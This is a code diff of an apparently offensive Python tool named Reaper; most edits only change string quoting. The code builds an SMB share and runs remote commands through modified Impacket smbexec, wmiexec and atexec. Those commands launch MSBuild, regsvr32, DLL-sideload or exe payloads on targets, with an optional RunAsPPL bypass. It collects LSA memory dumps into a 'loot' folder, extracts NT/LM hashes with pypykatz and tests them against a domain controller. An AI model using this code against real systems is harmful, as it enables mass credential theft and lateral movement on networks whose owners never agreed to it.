@@ -64,9 +64,9 @@ color_YELL = '\033[93m'
 color_BLU = '\033[94m'
 color_PURP = '\033[35m'
 color_reset = '\033[0m'
-green_plus = "{}[+]{}".format(color_GRE, color_reset)
-red_minus = "{}[-]{}".format(color_RED, color_reset)
-gold_plus = "{}[+]{}".format(color_YELL, color_reset)
+green_plus = '{}[+]{}'.format(color_GRE, color_reset)
+red_minus = '{}[-]{}'.format(color_RED, color_reset)
+gold_plus = '{}[+]{}'.format(color_YELL, color_reset)
 
 reaper_banner = """
 
@@ -1064,10 +1064,10 @@ def setup_share():
     else:
         share_group = options.sharegroup
 
-    printnlog("\n[Generating share]")
+    printnlog('\n[Generating share]')
     # making the directory
-    printnlog("{} Creating the share folder".format(green_plus))
-    os.system("sudo mkdir /var/tmp/" + share_name)
+    printnlog('{} Creating the share folder'.format(green_plus))
+    os.system('sudo mkdir /var/tmp/' + share_name)
 
     # smb.conf edits
     data = """[{}]
@@ -1085,33 +1085,33 @@ def setup_share():
     """.format(share_name, share_name, share_user, share_group)
 
     # copy old smb.conf file so its safe
-    printnlog("{} Backing up the smb.conf file".format(green_plus))
-    os.system("sudo cp /etc/samba/smb.conf " + cwd + "/")
-    printnlog("{} Making modifications".format(green_plus))
+    printnlog('{} Backing up the smb.conf file'.format(green_plus))
+    os.system('sudo cp /etc/samba/smb.conf ' + cwd + "/")
+    printnlog('{} Making modifications'.format(green_plus))
     with open('/etc/samba/smb.conf', 'a') as f:
         f.write(data)
         f.close()
 
     # create the user for the share
     # generate the group
-    printnlog("{} Creating the group: {}".format(green_plus, share_group))
-    os.system("sudo groupadd --system " + share_group)
+    printnlog('{} Creating the group: {}'.format(green_plus, share_group))
+    os.system('sudo groupadd --system ' + share_group)
     # make the user
-    print("{} Creating the user: {}".format(green_plus, share_user))
-    os.system("sudo useradd --system --no-create-home --group " + share_group + " -s /bin/false " + share_user)
+    printnlog('{} Creating the user: {}'.format(green_plus, share_user))
+    os.system('sudo useradd --system --no-create-home --group ' + share_group + " -s /bin/false " + share_user)
     # give the user access to the share folder
-    printnlog("{} Giving the user rights".format(green_plus))
-    os.system("sudo chown -R " + share_user + ":" + share_group + " /var/tmp/" + share_name)
+    printnlog('{} Giving the user rights'.format(green_plus))
+    os.system('sudo chown -R ' + share_user + ":" + share_group + " /var/tmp/" + share_name)
     # expand access to the group
-    printnlog("{} Giving the group rights".format(green_plus))
-    os.system("sudo chmod -R g+w /var/tmp/" + share_name)
+    printnlog('{} Giving the group rights'.format(green_plus))
+    os.system('sudo chmod -R g+w /var/tmp/' + share_name)
     # create the smbusers password
-    printnlog("{} Editing the SMB password".format(green_plus))
+    printnlog('{} Editing the SMB password'.format(green_plus))
     proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
     proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
     # restart the smb service
-    printnlog("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
-    os.system("sudo systemctl restart smbd")
+    printnlog('{}[+]{} Restarting the SMB service'.format(color_BLU, color_reset))
+    os.system('sudo systemctl restart smbd')
 
     return share_name, share_user, share_pass, payload_name, share_group
 
@@ -1120,61 +1120,61 @@ def alt_exec():
     yes = input('Press enter to exit ')
 
     try:  # move the share file to the loot dir
-        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
         printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
     except BaseException as e:
         pass
 
     if options.ap:  # autoparse
-        printnlog("\n[parsing files]")
-        os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
-        os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
+        printnlog('\n[parsing files]')
+        os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
+        os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
         os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
 
         remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
         if remove_files.lower() == 'y':
             os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
 
-    printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    printnlog('\n{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     try:
-        os.system("sudo systemctl stop smbd")
-        printnlog(green_plus + " Stopped the smbd service")
+        os.system('sudo systemctl stop smbd')
+        printnlog(green_plus + ' Stopped the smbd service')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-        printnlog(green_plus + " Cleaned up the smb.conf file")
+        os.system('sudo cp ' + cwd + "/smb.conf /etc/samba/smb.conf")
+        printnlog(green_plus + ' Cleaned up the smb.conf file')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo rm " + cwd + "/smb.conf")
+        os.system('sudo rm ' + cwd + '/smb.conf')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo userdel " + share_user)
-        printnlog(green_plus + " Removed the user: " + share_user)
+        os.system('sudo userdel ' + share_user)
+        printnlog(green_plus + ' Removed the user: ' + share_user)
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo groupdel " + share_group)
-        printnlog(green_plus + " Removed the group: " + share_group)
+        os.system('sudo groupdel ' + share_group)
+        printnlog(green_plus + ' Removed the group: ' + share_group)
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
     except BaseException as e:
         pass
 
-    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+    print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
     sys.exit(0)
 
 
@@ -1228,46 +1228,46 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
                     if cont.lower() == 'n':
                         printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
                         try:
-                            os.system("sudo systemctl stop smbd")
-                            printnlog(green_plus + " Stopped the smbd service")
+                            os.system('sudo systemctl stop smbd')
+                            printnlog(green_plus + ' Stopped the smbd service')
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo cp " + cwd + "{}/smb.conf /etc/samba/smb.conf")
-                            printnlog(green_plus + " Cleaned up the smb.conf file")
+                            os.system('sudo cp ' + cwd + '{}/smb.conf /etc/samba/smb.conf')
+                            printnlog(green_plus + ' Cleaned up the smb.conf file')
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo rm " + cwd + "/smb.conf")
+                            os.system('sudo rm ' + cwd + '/smb.conf')
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo userdel " + share_user)
-                            printnlog(green_plus + " Removed the user: " + share_user)
+                            os.system('sudo userdel ' + share_user)
+                            printnlog(green_plus + ' Removed the user: ' + share_user)
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo groupdel " + share_group)
-                            printnlog(green_plus + " Removed the group: " + share_group)
+                            os.system('sudo groupdel ' + share_group)
+                            printnlog(green_plus + ' Removed the group: ' + share_group)
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+                            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
                             printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+                            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
                         except BaseException as e:
                             pass
 
-                        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+                        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
                         sys.exit(0)
                 continue
             # end of antilocout check
@@ -1324,7 +1324,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
 
 def mt_execute(ip, count):  # multithreading requires a function
-    printnlog("{} Attacking {}".format(green_plus, ip))
+    printnlog('{} Attacking {}'.format(green_plus, ip))
     try:
         if options.method == 'wmiexec':
             executer = WMIEXEC(command, username, password, domain, options.hashes, options.aesKey, options.share, False, options.k, options.dc_ip, 'cmd')
@@ -1357,7 +1357,7 @@ def port445_check(interface_ip):
         sock.bind((interface_ip, 445))
     except socket.error as e:
         if e.errno == errno.EADDRINUSE:
-            printnlog("{} Port 445 is already in use".format(red_minus))
+            printnlog('{} Port 445 is already in use'.format(red_minus))
             sys.exit(0)
         else:
             # something else raised the socket.error exception
@@ -1390,18 +1390,21 @@ def update_chk():
 # Process command-line arguments.
 if __name__ == '__main__':
     # quick checks to see if were good
-    if sys.platform != "linux":
-        printnlog("[!] This program is Linux only")
+    if sys.platform != 'linux':
+        printnlog('[!] This program is Linux only')
         sys.exit(1)
 
-    if os.path.isdir(cwd + "/loot") == False:
-        os.makedirs(cwd + "/loot")
+    if os.path.isdir('{}/loot'.format(cwd)) == False:
+        os.makedirs('{}/loot'.format(cwd))
+
+    if os.path.isfile('{}/indivlog.txt'.format(cwd)):
+        os.system('sudo rm {}/indivlog.txt'.format(cwd))
 
     printnlog(reaper_banner)
     update_chk()
     printnlog(version.BANNER)
 
-    parser = argparse.ArgumentParser(add_help=True, description="", epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
     if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
         parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
     parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec, ADMIN$ for wmiexec) (wmiexec and smbexec ONLY)')
@@ -1452,7 +1455,7 @@ if __name__ == '__main__':
         sys.exit(1)
 
     if os.geteuid() != 0:
-        printnlog("[!] Must be run as sudo")
+        printnlog('[!] Must be run as sudo')
         sys.exit(1)
 
     options = parser.parse_args()
@@ -1463,26 +1466,26 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init(options.ts)
 
-    if "-share" not in sys.argv and options.method == "wmiexec":  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
-        options.share = "ADMIN$"
+    if '-share' not in sys.argv and options.method == 'wmiexec':  # ADMIN$ is the default share for wmiexec wheres C$ is the default for smbexec and we need a way to determine if the user has not provided on to used the default for this
+        options.share = 'ADMIN$'
 
-    if options.runasppl and options.method != "smbexec":  # check to see if they are trying to run runasppl bypass with something other than smbexec
-        printnlog("{}[!]{} RunAsPPL Bypass only works with the SMBExec method".format(color_RED, color_reset))
+    if options.runasppl and options.method != 'smbexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec
+        printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
         sys.exit(0)
 
     if options.runasppl and options.payload != "msbuild":  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
-        printnlog("{}[!]{} RunAsPPL Bypass only works with the MsBuild payload".format(color_RED, color_reset))
+        printnlog('{}[!]{} RunAsPPL Bypass only works with the MsBuild payload'.format(color_RED, color_reset))
         sys.exit(0)
 
     if options.runasppl:
         if options.debug == False:
-            printnlog("I HIGHLY recommend turning on -debug")
-        plzno = input("{}[!]{} RunAsPPL Bypass uses a kernel driver which theoretically can cause a BSOD are you absolutely sure you want to use this? Also this only works every other time (y/N): ".format(color_YELL, color_reset))
+            printnlog('I HIGHLY recommend turning on -debug')
+        plzno = input('{}[!]{} RunAsPPL Bypass uses a kernel driver which theoretically can cause a BSOD are you absolutely sure you want to use this? Also this only works every other time (y/N): '.format(color_YELL, color_reset))
         if plzno.lower() != 'y':
             sys.exit(0)
 
     if options.payload == 'dllsideload' and options.method == 'wmiexec':
-        cont = input("{}[!]{} Warning you are attempting to run dllsideload via wmiexec which will work, however it will hang until timeout do you want to (c)ontinue, (n)o exit, or (y)es switch to smbexec: ".format(color_YELL, color_reset))
+        cont = input('{}[!]{} Warning you are attempting to run dllsideload via wmiexec which will work, however it will hang until timeout do you want to (c)ontinue, (n)o exit, or (y)es switch to smbexec: '.format(color_YELL, color_reset))
         if cont.lower() == 'n':
             sys.exit(0)
         elif cont.lower() == 'y':
@@ -1506,7 +1509,7 @@ if __name__ == '__main__':
             major_version, minor_version = options.com_version.split('.')
             COMVERSION.set_default_version(int(major_version), int(minor_version))
         except Exception:
-            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
+            logging.error('Wrong COMVERSION format, use dot separated integers e.g. "5.7"')
             sys.exit(1)
 
     if '-oe' in sys.argv:
@@ -1530,7 +1533,7 @@ if __name__ == '__main__':
         if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
             from getpass import getpass
 
-            password = getpass("Password:")
+            password = getpass('Password:')
 
         if options.aesKey is not None:
             options.k = True
@@ -1549,13 +1552,13 @@ if __name__ == '__main__':
             try:  # check to see if the interface has an ip
                 if local_ip in ifaces:
                     local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
-                    printnlog("local IP => " + local_ip)
+                    printnlog('local IP => ' + local_ip)
             except BaseException as exc:
                 printnlog('{}[!!]{} Error could not get that interface\'s address. Does it have an IP?'.format(color_RED, color_reset))
                 sys.exit(0)
         else:
             # print local interfaces and ips
-            print("")
+            print('')
             ifaces = ni.interfaces()
             for face in ifaces:
                 try:  # check to see if the interface has an ip
@@ -1563,12 +1566,12 @@ if __name__ == '__main__':
                 except BaseException as exc:
                     continue
 
-            local_ip = input("\nEnter you local ip or interface: ")
+            local_ip = input('\nEnter you local ip or interface: ')
 
             # lets you enter eth0 as the ip
             if local_ip in ifaces:
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
-                printnlog("local IP => " + local_ip)
+                printnlog('local IP => ' + local_ip)
 
         port445_check(local_ip)  # check if port 445 is in use
 
@@ -1576,7 +1579,7 @@ if __name__ == '__main__':
             addresses = do_ip(address, local_ip)  # gets a list of up hosts
 
             if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
-                printnlog("{}[!]{} There are no targets up or the provided list is empty.".format(color_RED, color_reset))
+                printnlog('{}[!]{} There are no targets up or the provided list is empty.'.format(color_RED, color_reset))
                 sys.exit(0)
 
             if os.path.isfile('{}/hist'.format(cwd)):
@@ -1608,17 +1611,17 @@ if __name__ == '__main__':
                     f.write(currip + '\n')
 
             if len(addresses) < 1:  # ensure that there are targets otherwise whats the point
-                printnlog("{}[!]{} There are no targets up or the provided list is empty or you skipped all of the targets from previous history.".format(color_RED, color_reset))
+                printnlog('{}[!]{} There are no targets up or the provided list is empty or you skipped all of the targets from previous history.'.format(color_RED, color_reset))
                 sys.exit(0)
 
             if len(addresses) > 500:  # ensure that they dont waste over 25 gb of storage
-                printnlog("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
+                printnlog('\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? '.format(str(len(addresses)), str((len(addresses) * 52) / 1024)))
                 choice = input("(N/y): ")
                 if choice.lower() == 'n':
                     sys.exit(0)
 
         share_name, share_user, share_pass, payload_name, share_group = setup_share()  # creates and starts our share
-        printnlog("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
+        printnlog('\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n'.format(share_name, share_user, share_pass))
 
         # automatically find the best drive to use
         if options.drive is None and (options.method == 'wmiexec' or options.method == 'smbexec') and options.oe == False:
@@ -1636,20 +1639,20 @@ if __name__ == '__main__':
         elif options.payload == 'dllsideload':
             gen_payload_dllsideload(share_name, addresses)
 
-        if options.oe == False:
-            printnlog("\n[This is where the fun begins]\n{} Executing {} via {}\n".format(green_plus, options.payload, options.method))
+        if not options.oe:
+            printnlog('\n[This is where the fun begins]\n{} Executing {} via {}\n'.format(green_plus, options.payload, options.method))
 
         if options.payload == 'msbuild':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'regsvr32':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
         elif options.payload == 'exe':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         elif options.payload == 'dllsideload':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
 
         printnlog(command)
-        printnlog("")
+        printnlog('')
 
         if options.oe:
             alt_exec()
@@ -1678,7 +1681,7 @@ if __name__ == '__main__':
                 count += 1
 
         time.sleep(2)
-        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+        os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
         printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
 
         # for when you're attacking a lot of targets to quickly see how many we got
@@ -1697,9 +1700,9 @@ if __name__ == '__main__':
             f.close()
 
         if options.ap:
-            printnlog("\n[parsing files]")
-            os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
-            os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
+            printnlog('\n[parsing files]')
+            os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
+            os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
             os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
 
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
@@ -1722,7 +1725,7 @@ if __name__ == '__main__':
                         if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
                             msv_creds_cleaned.append(cred)
                     if len(msv_creds_cleaned) > 0:
-                        ip_to_check_against = input("\nEnter an IP to check the accounts against (Preferably a domain controller): ")
+                        ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')
 
                         printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
                         tried_full = []
@@ -1750,91 +1753,91 @@ if __name__ == '__main__':
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
-        printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+        printnlog('\n{}[!]{} Cleaning up please wait'.format(color_YELL, color_reset))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
         try:
-            os.system("sudo systemctl stop smbd")
-            printnlog(green_plus + " Stopped the smbd service")
+            os.system('sudo systemctl stop smbd')
+            printnlog(green_plus + ' Stopped the smbd service')
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-            printnlog(green_plus + " Cleaned up the smb.conf file")
+            os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
+            printnlog(green_plus + ' Cleaned up the smb.conf file')
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo rm " + cwd + "/smb.conf")
+            os.system('sudo rm ' + cwd + '/smb.conf')
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo userdel " + share_user)
-            printnlog(green_plus + " Removed the user: " + share_user)
+            os.system('sudo userdel ' + share_user)
+            printnlog(green_plus + ' Removed the user: ' + share_user)
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo groupdel " + share_group)
-            printnlog(green_plus + " Removed the group: " + share_group)
+            os.system('sudo groupdel ' + share_group)
+            printnlog(green_plus + ' Removed the group: ' + share_group)
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
+            os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
             printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+            os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
         except BaseException as e:
             pass
 
-        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+        print('{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
         sys.exit(0)
 
-    printnlog("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     try:
-        os.system("sudo systemctl stop smbd")
-        printnlog(green_plus + " Stopped the smbd service")
+        os.system('sudo systemctl stop smbd')
+        printnlog(green_plus + ' Stopped the smbd service')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-        printnlog(green_plus + " Cleaned up the smb.conf file")
+        os.system('sudo cp ' + cwd + '/smb.conf /etc/samba/smb.conf')
+        printnlog(green_plus + ' Cleaned up the smb.conf file')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo rm " + cwd + "/smb.conf")
+        os.system('sudo rm ' + cwd + '/smb.conf')
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo userdel " + share_user)
-        printnlog(green_plus + " Removed the user: " + share_user)
+        os.system('sudo userdel ' + share_user)
+        printnlog(green_plus + ' Removed the user: ' + share_user)
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo groupdel " + share_group)
-        printnlog(green_plus + " Removed the group: " + share_group)
+        os.system('sudo groupdel ' + share_group)
+        printnlog(green_plus + ' Removed the group: ' + share_group)
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
+        os.system('sudo mv {}/indivlog.txt {}/loot/{}/log.txt'.format(cwd, cwd, timestamp))
     except BaseException as e:
         pass
 
-    print("{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+    print('{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C'.format(color_BLU, color_reset))
     sys.exit(0)
